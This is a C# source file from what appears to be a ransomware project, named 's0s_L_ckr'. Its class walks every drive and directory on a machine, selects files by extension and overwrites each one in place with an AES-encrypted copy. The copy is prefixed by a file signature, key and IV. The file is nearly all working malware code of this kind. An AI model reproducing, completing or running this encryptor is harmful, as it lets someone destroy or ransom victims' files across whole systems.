using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace s0s_L_ckr
{
    public sealed class EncrStr
    {
        //Encryption Method

        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public void EncrDis()
        {

            DriveInfo[] allDrives = DriveInfo.GetDrives();

            //Iterate all drives
            foreach (DriveInfo d in allDrives)
            {
                EncrDrv(d);
            }
        }
        private void EncrDrv(DriveInfo drive)
        {
            // Drive check
            if (drive.IsReady == true)
            {
                DirectoryInfo[] di = drive.RootDirectory.GetDirectories();

                try
                {
                    foreach (DirectoryInfo directoryInfo in di)
                        EncrDir(directoryInfo);
                }

                catch (Exception e)
                {
                    Console.WriteLine("Woopsie", e.ToString());
                }

            }
            else
            {
                Console.WriteLine("Error in Drive state " + drive.Name);
            }
        }

        private void EncrDir(DirectoryInfo directoryInfo)
        {
            //Checking Directory Filter
            if (!Comn.DireInFil(directoryInfo.FullName))
            {
                Console.WriteLine($"Error in {directoryInfo.FullName}");
                return;
            }

            //Recursiveve Drives>Directories>Files
            try
            {
                DirectoryInfo[] subDrv = directoryInfo.GetDirectories();
                if (subDrv != null)
                {
                    foreach (DirectoryInfo subDir in subDrv)
                        EncrDir(subDir);
                }

                //Encrypt Files
                FileInfo[] files = directoryInfo.GetFiles();
                foreach (FileInfo file in files)
                    EncrFil(file);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[!] Error while in {directoryInfo.Name}");
                Console.WriteLine(e.ToString());
            }
        }

        private void EncrFil(FileInfo file)
        {
            Thread.Sleep(10);
            //Console.WriteLine($"[*] EncrFil at {file.Name}");

            //File Filter
            if (Comn.FileInFil(file.Extension))
            {
                Console.WriteLine("Encrypting " + file.FullName);
                //If file signature returns false
                bool v = Comn.CheckSig(file);
                bool b = true;
                if (b)
                {
                    //Encrypt all the things
                    //Rotate AES Key
                    CriptoKeyMgr.RotAesKey();

                    //Reading Data in files
                    Byte[] fileDat = null;
                    FileMgr.ReadFil(file, ref fileDat);

                    try
                    {
                        //Encrypt File
                        //CriptoFilMgr.EncryptFile(file.FullName);
                        using (FileStream fileStream = File.OpenWrite(file.FullName))
                        {
                            fileStream.Position = 0;

                            //File Structure for encrypted data
                            fileStream.Write(ConfigMgr.FILE_SIGN, 0, ConfigMgr.FILE_SIGN_SIZE);
                            fileStream.Write(CriptoKeyMgr.CURR_FIL_ENC_KEY, 0, CriptoKeyMgr.CURR_FIL_ENC_KEY.Length);
                            fileStream.Write(CriptoKeyMgr.CURR_FIL_ENC_IV, 0, CriptoKeyMgr.CURR_FIL_ENC_IV.Length);
                            fileStream.Flush();

                            //Write Encrypted data to section
                            CriptoFilMgr.Encrypt(fileStream, ref fileDat);
                        }
                    }
                    catch (UnauthorizedAccessException)
                    {
                        Console.WriteLine("[+] File Already Encrypted");
                        return;
                    }

                    //Console.WriteLine("[+] File Filtr not Allowed");
                }
            }
        }
    }
}
